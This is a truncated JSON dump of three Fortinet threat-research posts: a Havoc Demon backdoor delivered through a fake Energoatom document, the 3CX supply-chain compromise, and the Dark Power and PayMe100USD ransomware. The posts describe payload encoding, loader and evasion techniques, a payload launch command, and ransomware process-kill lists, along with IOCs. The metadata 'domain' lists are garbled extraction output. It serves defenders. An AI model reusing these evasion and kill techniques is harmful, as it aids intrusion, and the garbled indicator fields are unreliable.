    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Targeted Windows usersImpact:Compromised machines are under the control of the threat actorSeverity level:Medium As part of our ongoing research on malware being used in the Russian-Ukrainian conflict, FortiGuard Labs has encountered a malicious spoofed document pretending to be from the Ukrainian company, Energoatom, a state-owned enterprise that operates Ukraine’s nuclear power plants. Since the war with Russia began, Ukraine’s energy sector has been under constantcyberattack. For example, in April 2022, anattackdeploying INDUSTROYER2 and CADDYWIPER wiper malware targeted energy companies. On 16 August 2022, the Energoatom corporate website was the target of a DDoS attack. And in October 2022, yet another wiper attack, this one using the wiper dubbed NikoWiper, targeted the energy sector. Aside from highlighting the technical details of this latest multi-staged attack, which includes several evasion techniques, this article also discusses some strange artifacts that make us think this could be a work-in-progress or part of a red-team exercise. The macro-enabled document is named “zatverdzhenniy_spisok_osib_na_otrim”, which roughly translates to “approved list of persons to receive” in Ukrainian. It arrives inside an ISO image archive bearing the same filename. It was first submitted to VirusTotal in mid-March of this year. When opened, it displays an image instructing the user to enable Word’s macro code execution to reveal information supposedly protected by M. E. Doc (My Electronic Document). This popular Ukrainian document management system is used to exchange important and sensitive documents with organizations (including regulatory authorities) in electronic form. Blurred content with the logo for Energoatom is displayed behind the instruction, making it appear to be protecting important information (Figure 1). In reality, it’s just an ordinary image placed on the top layer of the document. Dragging it to the side reveals the supposedly protected information underneath. Once the macro is enabled, the image disappears, creating the impression that the critical information has somehow been revealed. The document contains an announcement about a list of people supposedly approved to receive protective equipment (Figure 2). To complicate analysis and attempt to evade detection, the macro’s VBA code employs a few interesting techniques. The Word application crashes when trying to view or debug the VBA code in the document. Similarly, when the document composition is analyzed usingoletools(a package of python tools used to analyze Microsoft OLE2 files), the tool produces several errors, including stream files that have been defined but are not present within the archive. The tool also reports an error about an incorrect signature when attempting to decompress a specific stream inside the file. We have not confirmed if either of these anomalies directly led to the crash above. Nevertheless, oletools eventually extracted the complete malicious VBA macro code intended to be executed by the document. In a likely attempt to make the location of the macro code less obvious, the VBA Project binary file that contains the actual VBA code is redirected to the file “EbDYTPZ.vEypm” instead of the default “vbaProject.bin”. This association is detailed in “word\\_rels\\ document.xml.rels” of the Office Open XML archive with the following line: “<Relationship Id=\"rId1\" Type=\"http://schemas.microsoft.com/office/2006/relationships/vbaProject\" Target=\"EbDYTPZ.vEypm\"/>” As usual, the VBA code is set to execute when the document is opened via AutoOpen and Document_Open events. As mentioned, the macro begins by deleting the overlay image, which is internally a Shape object with the Name attribute “happy”. To find this image, it iterates through all the Shape objects in the document and deletes the one with the same name. To hide the strings it uses during its execution, it primarily uses a simple encoding by subtracting 35 from each character of the original string and encoding the result with Base64. In addition, it uses other operations, such as string reverse and character splitting, prior to decoding. As an anti-debugging technique, execution of the primary infection routine uses theApplication. OnTimefunction commonly used to schedule the execution of a specific VBA procedure instead of directly calling it. In this case, it schedules the immediate execution of the function “ostrategicy”. When debugging, this line of code produces theerror, “Can’t execute code in break mode”, and then stops executing. As seen in Figure 3, seemingly random nonsensical comments are also added to the VBA code. This malware then checks if a hardcoded path, “C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll”, exists in the system. As discussed later, this is the same file path where the payload would be written. This strange implementation detail makes us think this may be a work in progress and could be a test sample created for a threat campaign that will soon be launched. The file at the abovementioned path is executed if it exists. Otherwise, the code extracts the payload that is cleverly stored as a node named “TwXfx” in a custom XML part of the document. Custom XML partsis a feature that was introduced with Office Open XML format. It is used for storing arbitrary data that the document could programmatically access. To get to the payload data, it starts by enumerating all the custom XML part objects in the document and then checking if they have a node named “TwXfx”. That node contains the encoded payload. Below is a screenshot of the encoded payload stored in “customXml\\item1.xml” of the document archive (Figure 4). Although the payload in this document is stored in a single node, the VBA code also supports an encoded payload split across several nodes, further complicating its extraction. In fact, before assuming that the data is stored in a single node, it first checks to determine whether it is stored in several nodes. It does this by trying to find the node name, in this case, “TwXfx”, with an appended index, i.e., “TwXfx_0”. If the node exists, it moves on to find the next one by incrementing the index (i.e., TwXfx_1). It repeats this until it fails to find a node, which means it has reached the end of the payload. Once a node is found, the content of the node is read, and its XML tags are removed. Furthermore, if a string “__b_” is found at the beginning of the data, it is also removed. Similar to decoding strings, the binary payload is extracted by decoding the data using Base64 and adding 35. Only this time, the resulting bytes are further decoded with xor 82. The decoded payload is a 64-bit executable (.exe). The storage of a payload binary as a custom XML part of the document is a technique very similar to what’s presented inthis blogfrom the website mgeeky.tech. Even on the code level, there are striking similarities between the code used by the malicious document and what’s presented in that blog. The website author offers a private tool that provides similar capabilities. Still, the creator of this malicious document could have easily replicated the technique from the publicly available PoC linked in the blog. Figure 5 shows one of the several code similarities observed in the function for locating the payload node in the document. Once the payload is decoded, it is written to the hardcoded path “C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll” and executed usingShellExecutewith the following command line: C:\\Windows\\System32\\conhost.exe --headless \"C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll\" \"” This eventually leads to the execution of a Havoc Demon agent, as discussed in the next section. Based on the filename of the payload binary, it tries to masquerade as a legitimate component of Microsoft Office. It is even signed with an invalid portal.office.com certificate (Figure 6). While this file has a DLL extension and contains multiple exports (Figure 7), it is a standalone EXE file. Upon execution, it locates a packed and compressed payload in the.vdatasection (Figure 8) of the memory allocated for the current process. The payload storage is structured as follows: 1. Offset 0x0: Magic (8 bytes) 2. Offset 0x8: Encrypted flag (0 = not encrypted, 3 = RC4 encryption) 3. Offset 0x9: Compression flag (0 = not compressed, 3 = LZNT1 compression) 4. Offset 0xa: RC4 key (64 bytes) 5. 0ffset 0x4a: Compressed size (4 bytes) 6. Offset 0x4e: Uncompressed size (4 bytes) 7. Offset 0x52: Loader configuration string length (2 bytes) 8. Offset 0x154: Start of encrypted and compressed loader configuration and payload After decrypting and decompressing the payload, we see a pipe-delimited configuration followed by the actual shellcode to be executed (Figure 9). The loader configuration format is as follows: After parsing the configuration, this loader prepends a stub containing 79 bytes of junk instructions before the actual payload shellcode. The bytes at 25 hardcoded offsets within this stub are replaced with random bytes to hinder shellcode detection. It first ensures that a file within the %TEMP% does not exist before attempting to launch the payload. The name of this file is derived from a value computed from hour / 3 + year + month + day of the current time. Hence, the payload will only be executed up to 8 times per day. To launch the shellcode, the loader callsZwCreateThreadExto create a new suspended injection thread hidden from debuggers using theTHREAD_CREATE_FLAGS_CREATE_SUSPENDED(0x01) andTHREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER(0x4) thread creation flags. By removing theTHREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGERflag before theZwCreateThreadExcall and using memory breakpoints, the shellcode can be debugged in the usual manner when the thread resumes execution. While not enabled in this sample, the loader also supports sleep obfuscation to hinder detection by memory scanners. It does this by redirecting calls to the Windows Sleep API to its own function that performs the following: 1. Suspends all threads in the current process 2. Reverts the patched Sleep API code bytes 3. Reverts patches to security APIs (only if patching was configured) 4. Encodes sensitive memory regions in the current process with a randomized XOR key 5. Calls Sleep with the specified timeout 6. Decodes sensitive memory regions in the current process with the same XOR key 7. Patches security-related APIs to disable them 8. Patches Sleep to redirect to this function again 9. Resumes all threads in the current process The patched APIs are: Interestingly, well-known Cobalt Strike configuration field names (Figure 10) are also found in plaintext within the sample, possibly to confuse static analysis tools. The second stage consists of a shellcode with a Havoc C2 agent DLL appended to it. Havoc C2 framework is an open-source post-exploitation toolkit developed by C5pider and comprises the following components: The shellcode looks for 0x4d 0x5a and 0x50 0x45 bytes that denote the “MZ\" and “PE” headers of a Windows PE executable file to locate the payload in memory. It then calls the loader (referred to internally as KaynLdr in thesource code) KaynLdr resolves theLdrLoadDll,ZwAllocateVirtualMemory,andNtProtectVirtualMemoryNative APIs via API hashing before using them to allocate memory, load the Demon agent payload, and execute it directly from memory. The relevant API hashes are: The DLL loaded by KaynLdr is the Havoc Demon agent, which is analogous to Beacon for the popular Cobalt Strike framework. The configuration is embedded within the Demon sample. Demon communicates with the C2 server specified in the configuration via HTTP or HTTPS POST requests. A randomized 256-bit key and 128-bit IV are generated and shared with the C2 server on the initial check-in request (Figure 11) for encrypting subsequent data communicated between the agent and C2 server with AES-256-CTR. The relevant fields in the check-in request are as follows: 1. Size of data package 2. Magic value: 0xDE 0xAD 0xBE 0xEF (hardcoded into Havoc) 3. Agent ID 4. Command ID: 0x63 (DEMON_INITIALIZE) 5. 32-byte AES key 6. 16-byte AES IV 7. AES-encrypted data While Demon can be configured to rotate among multiple C2 domains, only one C2 domain, \"ukrtatnafta[.]org\", is specified for this sample. This domain is very similar to ukrtatnafta[.]com, owned by Ukrtatnafta, a Ukrainian oil refining company. To blend in with legitimate HTTP/HTTPS traffic, Demon randomly picks one of several URIs set in the configuration and applies a specified list of HTTP headers in the requests to the C2. The Teamserver C2 configuration extracted from this sample can be seen below. The major features of Demon include: As this Demon sample was unmodified from the version in Github, we will not analyze it in detail here. Interested readers may refer to thedocumentationandsource codeon GitHub. This malware campaign showcases some interesting techniques threat actors use to evade detection and hinder analysis. Using a combination of such techniques, threat actors may gain sufficient time to complete their post-exploitation commands upon successful infection before they are detected. Although the document contains some indicators of a potential red-team exercise, e.g., the hardcoded path for persisting the payload on disk and use of a relatively novel payload encoding technique, it is also entirely possible that this could be a campaign under development as many red-team tools have been weaponized recently for malicious purposes. As this document delivers a backdoor that will silently provide control over the infected user’s system to a remote operator with unknown intentions, it is safer to err on the side of caution and ensure protections are in place. The increasing use of open-source offensive security frameworks is a double-edged sword. On the one hand, both red and blue teams can benefit from the availability of the source code to better understand how these techniques work, address detection gaps, and improve the cyber resilience of their organizations. On the other hand, it enables threat actors to abuse these frameworks to conduct attacks without developing or purchasing custom malware. FortiGuard AntiVirus detects the malicious files identified in this report as The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. The Fortinet AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. This type of threats is usually delivered as email attachments. FortiMail can detect and quarantine the malicious attachments for such campaigns. Fortinet’s CDR (Content Disarm and Reconstruction) service can neutralize the embedded macros inside the Word document. The FortiGuard Web Filtering Service detects the C2 URLs cited in this report as Malicious and blocks them. FortiGuard Labs providesBackdoor. Havoc. AgentIPS signature to block Havoc C2 network communications. Due to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is important to keep all AV and IPS signatures up to date. We also suggest that organizations have their end users undergo our free NSE training:NSE 1 – Information Security Awareness. It includes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. File Hashes b773fa65bb375e6fe6d387f301f6bf33219189ea1d4a06762e965a9eba7de4e8 17637fac7f989549acd248ca9e5293d2b9a1a2e4bb0f7e4edf5571df35129f0c 9f797d705facebd1687b7765cbf65231e71821eb3c38dcc171a3fc88b9f52328 b6cb8a7cdce0bfd3a7402d22fb0014dedb259d6c91c1538ac74097b8ca22ca5c hxxps://ukrtatnafta[.]org hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/avias.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/mobile_menu.js hxxps://ukrtatnafta[.]org/wp-content/plugins/contact-form-7/includes/js/scripts.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/bootstrap.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/hovermenu.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/retina-1.1.0.js hxxps://ukrtatnafta[.]org/wp-content/plugins/js_composer/assets/lib/bower/isotope/dist/isotope.pkgd.min.js hxxps://ukrtatnafta[.]org/wp-content/themes/pressa/js/custom-script.js hxxps://ukrtatnafta[.]org/wp-includes/js/wp-emoji-release.min.js hxxps://ukrtatnafta[.]org/maps-api-v3/api/js/52/1/intl/uk_ALL/util.js hxxps://ukrtatnafta[.]org/wp-includes/js/wp-embed.min.js FortiGuards Labs,ukraine,malware analysis FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/malware-disguised-as-document-ukraine-energoatom-delivers-havoc-demon-backdoor",
      "scraped_at": "2025-07-20T13:58:16.275408",
      "indicators": {
        "ip_address": [],
        "domain": [
          "geeky",
          "",
          "baProject",
          "tem1",
          "in",
          "cripts",
          "p-emoji-release",
          "ortal",
          "p-embed",
          "fficeTelemetry",
          "til",
          "he",
          "chemas",
          "vias",
          "bDYTPZ",
          "onhost",
          "overmenu",
          "ootstrap",
          "sotope",
          "ocument",
          "ustom-script"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "9f797d705facebd1687b7765cbf65231e71821eb3c38dcc171a3fc88b9f52328",
          "17637fac7f989549acd248ca9e5293d2b9a1a2e4bb0f7e4edf5571df35129f0c",
          "b6cb8a7cdce0bfd3a7402d22fb0014dedb259d6c91c1538ac74097b8ca22ca5c",
          "b773fa65bb375e6fe6d387f301f6bf33219189ea1d4a06762e965a9eba7de4e8"
        ],
        "cve": [],
        "email": [],
        "url": [
          "http://schemas.microsoft.com/office/2006/relationships/vbaProject"
        ]
      },
      "threat_score": 0.31681559707554835
    }
  },
  {
    "id": "Fortinet_45048",
    "source": "Fortinet",
    "title": "3CX Desktop App Compromised (CVE-2023-29059)",
    "text": "FortiGuard Labs Threat Research This is a developing story. Please check back for the latest updates from FortiGuard Labs. For a report of this event, please visit ourThreat Signal Reportspage. OnMarch 29, a number of reports surfaced thata legitimate signed file from VoIP/IP PBX solutions provider 3CX (3CXDesktop App) had been trojanized due to a code-level compromise. This is the latest high-profilesupply chain attack, beginning with SolarWinds and Kaseya a few years ago. This issue has been assignedCVE-2023-29059. 3CXDesktop App is a multi-platform softphone application for desktops (Linux, MacOS, and Windows). The 3CXDesktop App allows users to interact via chat, messaging, video, and voice. Initial reports suggested that all platforms of the 3CXDesktop App were compromised. But at the time of writing, it appears that only the Electron framework versions of MacOS (versions 18.11.1213, 18.12.402, 18.12.407, and 18.12.416) and Windows (versions 18.12.407 and 18.12.416) of the 3CX Desktop App areaffected. 3CX has stated that they are working on a new version of the Windows app and have revoked the certificate for the previous version. Initially, there was some confusion about whether the MacOS version was affected, as the CEO of 3CX issued a statement that only the Windows version of the app was affected. However, this statement was laterretracted. Currently, no status on the availability of the MacOS version has been provided at the time of writing. The company’s website boasts that 3CX is available in over 190 countries worldwide, with over 12 million daily users and a 600,000-plus customer base. Companies listed on its website include high-profile organizations in the automobile, aerospace, finance, food and beverage, government, hospitality, and manufacturing sectors, to name a few. The trojanized 3CX Desktop App is part of a multi-stage attack that utilizes a malicious sideloaded DLL (ffmpeg.dll - SHA256: 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896) that contains instructions and a payload within another DLL via an encrypted blob (d3dcompiler_47.dll – SHA256: 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03). This blob also contains the shellcode, which tries to pull ICO files from GitHub (currently down) that contain various URIs for download, where the payload is ultimately loaded and installed to the target environment. However, we could not confirm further details as the repository is currently down. Looking at the Windows installer (SHA256:aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868), it drops TWO 3CXDesktopApp.exe files. The SECOND (inside app-18.12.407 folder) is the one that sideloads the ffmpeg.dll file. C:\\Users\\Admin\\AppData\\Local\\Programs\\3CXDesktopApp\\3CXDesktopApp.exe Filesize: 541KB MD5: 08d79e1fffa244cc0dc61f7d2036aca9 SHA1: 480dc408ef50be69ebcf84b95750f7e93a8a1859 SHA256: 54004dfaa48ca5fa91e3304fb99559a2395301c570026450882d6aad89132a02 C:\\Users\\Admin\\AppData\\Local\\Programs\\3CXDesktopApp\\app-18.12.407\\3CXDesktopApp.exe Filesize: 142MB MD5: bb915073385dd16a846dfa318afa3c19 SHA1: 6285ffb5f98d35cd98e78d48b63a05af6e4e4dea SHA256: dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc Below is a heat map based on recent connections to known malicious domains associated with this attack that FortiGuard Labs observed at the time of writing (March 31st, 2023): Based on our telemetry, we see that the top 10 countries highlight the geographic spread of victim machines calling out to known actor controlled infrastructure; which appears to target European and North American victims more: The following chart reveals a regional breakdown that further proves this point as close to 80 percent of the connections to the attacker controlled infrastructure are concentrated in Europe and North America. This may indicate that the threat actor is mainly targeting enterprises in those regions – however, this is uncertain. This could be indicative of 3CX product's geographic customer base - including the possibility of various multinational corporations operating inside those regions. 3CXsuggeststhat users migrate to the PWA app in the meantime. The PWA app is web-based and is unaffected by the supply chain attack. Customers on 3CXHosted and StartUP are not affected. Additional details on updates and best practices can be foundhere. FortiGuard Labs suggests that all older variants of the 3CX Desktop App be discontinued immediately until newer unaffected versions are available. Fortinet Customers running the latest definitions are protected by the following AV signatures: W64/Agent. CFM!tr OSX/Agent. CN!tr Riskware/Sphone_XC3 All known network IOCs related to this attack are blocked by the WebFiltering client. For a detailed overview of all Fortinet protections for this event, please visit ourOutbreak Alerts page. aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868 Riskware/Sphone_XC3 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983 Riskware/Sphone_XC3 92005051ae314d61074ed94a52e76b1c3e21e7f0e8c1d1fdd497a006ce45fa61 Riskware/Sphone_XC3 5407cda7d3a75e7b1e030b1f33337a56f293578ffa8b3ae19c671051ed314290 OSX/Agent. CN!tr b86c695822013483fa4e2dfdf712c5ee777d7b99cbad8c2fa2274b133481eadb Riskware/Sphone_XC3 e6bbc33815b9f20b0cf832d7401dd893fbc467c800728b5891336706da0dbcec Riskware/Sphone_XC3 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03 W64/Agent. CFM!tr 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896 Riskware/Sphone_XC3 c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02 Riskware/Sphone_XC3 b5e318240401010e4453e146e3e67464dd625cfef9cd51c5015d68550ee8cc09 W64/Agent. CFM!tr aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973 W64/Sphone_XC3. INFS!tr.dldr a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67 Riskware/Sphone_XC3 dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc Riskware/Sphone_XC3 fad482ded2e25ce9e1dd3d3ecc3227af714bdfbbde04347dbc1b21d6a3670405 Riskware/Sphone_XC3 FortiEDR detects installation of the 3CX Desktop App with a dynamic code exception event: FortiEDR also blocks the final payload making a network connection to C2: FortiGuard Labs has released a new Application Control signature that will detect attempted 3CX access activity which was released in definitions set (23.528): Regarding FortiAnalyzer, a knowledge base article that contains detailed insight on how to detect activities related to the 3CX Supply Chain attack can be foundhere. akamaicontainer[.]com akamaitechcloudservices[.]com azuredeploystore[.]com azureonlinecloud[.]com azureonlinestorage[.]com dunamistrd[.]com glcloudservice[.]com journalide[.]org msedgepackageinfo[.]com msstorageazure[.]com msstorageboxes[.]com officeaddons[.]com officestoragebox[.]com pbxcloudeservices[.]com pbxphonenetwork[.]com pbxsources[.]com qwepoi123098[.]com sbmsa[.]wikisourceslabs[.]com visualstudiofactory[.]com zacharryblogs[.]com azureonlinestorage.com convieneonline[.]com Soyoungjun[.]com FortiGuards Labs FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/3cx-desktop-app-compromised",
      "scraped_at": "2025-07-20T13:58:24.614386",
      "indicators": {
        "ip_address": [],
        "domain": [
          "zureonlinestorage",
          "CXDesktopApp",
          "r",
          "fmpeg"
        ],
        "hash_md5": [
          "bb915073385dd16a846dfa318afa3c19",
          "08d79e1fffa244cc0dc61f7d2036aca9"
        ],
        "hash_sha1": [
          "6285ffb5f98d35cd98e78d48b63a05af6e4e4dea",
          "480dc408ef50be69ebcf84b95750f7e93a8a1859"
        ],
        "hash_sha256": [
          "7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896",
          "dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc",
          "54004dfaa48ca5fa91e3304fb99559a2395301c570026450882d6aad89132a02",
          "aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868",
          "92005051ae314d61074ed94a52e76b1c3e21e7f0e8c1d1fdd497a006ce45fa61",
          "fad482ded2e25ce9e1dd3d3ecc3227af714bdfbbde04347dbc1b21d6a3670405",
          "11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03",
          "59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983",
          "aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973",
          "c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02",
          "5407cda7d3a75e7b1e030b1f33337a56f293578ffa8b3ae19c671051ed314290",
          "b86c695822013483fa4e2dfdf712c5ee777d7b99cbad8c2fa2274b133481eadb",
          "e6bbc33815b9f20b0cf832d7401dd893fbc467c800728b5891336706da0dbcec",
          "b5e318240401010e4453e146e3e67464dd625cfef9cd51c5015d68550ee8cc09",
          "a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67"
        ],
        "cve": [
          "CVE-2023-29059"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.7240948813982522
    }
  },
  {
    "id": "Fortinet_32855",
    "source": "Fortinet",
    "title": "Ransomware Roundup – Dark Power and PayMe100USD Ransomware",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Dark Power and PayME100USD ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Dark Power is a relatively new ransomware launched in early February 2023. This is a rare ransomware breed in that it was written in the Nim programming language. Dark Power Ransomware Infection Vector Information on the infection vector used by this group is not currently available. However, it is not likely to differ significantly from other ransomware groups. Dark Power Ransomware Execution Once the Dark Power ransomware is executed, it terminates the following processes to encrypt files that are presently in use: taskmgr.exe, encsvc.exe, powerpnt.exe, ocssd.exe, steam.exe, isqlplussvc.exe, outlook.exe, sql.exe, ocomm.exe, agntsvc.exe, mspub.exe, onenote.exe, winword.exe, thebat.exe, excel.exe, mydesktopqos.exe, ocautoupds.exe, thunderbird.exe, synctime.exe, infopath.exe, mydesktopservice.exe, firefox.exe, oracle.exe, sqbcoreservice.exe, dbeng50.exe, tbirdconfig.exe, msaccess.exe, visio.exe, dbsnmp.exe, wordpad.exe, xfssvccon.exe It also stops the following services: veeam, memtas, sql, mssql, backup, vss, Sophos, svc$, mepocs The ransomware then encrypts files and appends a “.dark_power” extension to the affected files. It avoids encrypting files and directories with the following extensions: .lib, .pack, .search-ms, .dat, .ini, .regtrans-ms, .vhdx, .ps1, .log2, .log1, .blf, .ldf, .lock, .theme, .msi, .sys, .wpx, .cpl, .adv, .msc, .scr, .bat, .key, .ico, .dll, .hta, .deskthemepack, .nomedia, .msu, .rtp, .msp, .idx, .ani, .386, .diagcfg, .bin, .mod, .ics, .com, .hlpF, .spl, .nls, .cab, .exe, .diagpkg, .icl, .ocx, .rom, .prf, .themepack, .msstyles, .lnk, .icns, .mpa, .drv, .cur, .diagcab, .cmd, .shs, readme.pdf (file name used for ransom note dropped by Dark Power ransomware), ef.exe (file name used for Dark Power ransomware), ntldr, thumbs.db, bootsect.bak, autorun.inf, ntuser.dat.log, boot.ini, iconcache.db, bootfont.bin, ntuser.dat, ntuser.ini, desktop.ini, program files, appdata, mozilla, $windows.~ws, application data, $windows.~bt, google, $recycle.bin, windows.old, programdata, system volume information, program files (x86), boot, tor browser, windows, intel, perflogs, msocache Once files have been encrypted, Dark Power drops a lengthy ransom note as a “readme.pdf”, as seen in Figure 1. The ransom note threatens victims that unless they send 10,000 USD worth of Monero (XMR) cryptocurrency to the attacker’s wallet within 72 hours, their encrypted files will be lost forever. During our research, we did not see the Dark Power ransomware delete volume shadow copies of the affected machine. As a result, such encrypted files are potentially recoverable. Note that the ransomware stops the Volume Shadow Copy (VSS) service before encrypting files. As such, files not written to a Volume Shadow Copy before the ransomware encrypted them are not recoverable from a backup created through the VSS. The ransom note also claims that the Dark Power threat actor stole data from the compromised machine, which will be published to its leak site on Tor if a ransom is not paid. At the time of this investigation, the leak site listed ten companies in various industries from nine countries in North America, Europe, and Africa. Stolen data does not appear to be kept on the leak site. The site claims that the attacker will share the file location once contacted via qTox. PayMe100USD is a new ransomware written in Python that was discovered in March 2023. The malware has basic functionality and performs ordinary ransomware activities. PayMe100USD Ransomware Infection Vector The PayMe100USD ransomware samples that FortiGuard Labs collected have a Microsoft Bing logo and a file name of “newbing.exe”. As such, the ransomware was likely distributed via fake Bing installers. PayMe100USD Ransomware Execution Once the PayMe100USD ransomware is executed, it encrypts files in the D, E, and F drives and the user directory in the C drive. It adds a “. PayMe100USD” file extension to the affected files. The ransomware avoids encrypting files with the following file extensions: .py, .pem, .exe, .mp4, .mkv, .payme100usd (file extensions of the files encrypted by PayMe100USD ransomware) , .iso The ransomware then drops eight ransom notes, labeled “PayMe 1.txt” to “PayMe 8.txt”. Although the last number in the file names differ, all ransom notes are identical. The ransom notes ask victims to pay 100 USD worth of Bitcoin within 48 hours to recover the affected files and stop the alleged stolen data from being sold on the dark web. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Dark Power ransomware variants with the following AV signatures: FortiGuard Labs detects known PayMe100USD ransomware variants with the following AV signature: File-based IOCs: 33c5b4c9a6c24729bb10165e34ae1cd2315cfce5763e65167bd58a57fde9a389 Dark Power ransomware 11ddebd9b22a3a21be11908feda0ea1e1aa97bc67b2dfefe766fcea467367394 Dark Power ransomware c2aa5d89d1fb63c65806a789f529daf774ceff411338c43438ea6c0175e10fd0 PayMe100USD ransomware 4daca38854ba0a471d25250f106122ff81b8bbda2b19569a9e0b6e7f56187746 PayMe100USD ransomware Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,ransomware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/dark-power-and-payme100usd-ransomware",
      "scraped_at": "2025-07-20T13:58:32.134954",
      "indicators": {
        "ip_address": [],
        "domain": [
          "",
          "ootsect",
          "hebat",
          "ecycle",
          "utorun",
          "ootfont",
          "humbs",
          "utlook",
          "comm",
          "bsnmp",
          "qbcoreservice",
          "gntsvc",
          "inword",
          "nenote",
          "ordpad",
          "racle",
          "ewbing",
          "oot",
          "spub",
          "tuser",
          "ynctime",
          "ncsvc",
          "ydesktopqos",
          "beng50",
          "askmgr",
          "fssvccon",
          "eadme",
          "nfopath",
          "saccess",
          "team",
          "xcel",
          "birdconfig",
          "concache",
          "irefox",
          "isio",
          "esktop",
          "owerpnt",
          "f",
          "indows",
          "sqlplussvc",
          "ql",
          "cssd",
          "ydesktopservice",
          "hunderbird",
          "cautoupds"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
